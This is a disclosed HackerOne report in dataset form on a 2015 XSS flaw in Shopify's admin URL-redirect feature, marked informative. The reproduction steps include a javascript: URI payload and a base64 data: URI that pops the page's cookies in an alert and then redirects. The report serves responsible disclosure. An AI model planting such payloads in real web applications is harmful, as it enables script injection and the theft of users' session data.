---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '56662'
original_report_id: '56662'
title: XSS - URL Redirects
weakness: Cross-site Scripting (XSS) - Generic
team_handle: shopify
created_at: '2015-04-16T14:07:22.344Z'
disclosed_at: '2015-05-16T22:08:40.757Z'
has_bounty: false
visibility: full
substate: informative
vote_count: 3
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# XSS - URL Redirects

## Metadata

- HackerOne Report ID: 56662
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: shopify
- Disclosed At: 2015-05-16T22:08:40.757Z
- Has Bounty: No
- Visibility: full
- Substate: informative

## Original Report

Hi!
I found that https://[shop name].myshopify.com/admin/redirects is vulnerable to XSS
To Reproduce:

1. Click Add Url Redirect
2. set page for redirect
3. add redirects as: 
javascript:alert(document.domain)
or data:text/html;base64,PHNjcmlwdD5hbGVydCgiY29va2llIHN0ZWFsOiAiK2RvY3VtZW50LmNvb2tpZSk7d2luZG93LmxvY2F0aW9uLmhyZWY9J2h0dHA6Ly93d3cuZ29vZ2xlLmNvbSc7PC9zY3JpcHQ+
(XSS and URL redirect)
4. A new redirect link created
5. Click on link
6. XSS

Thanks
Fr33d0m from vlazeg team

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
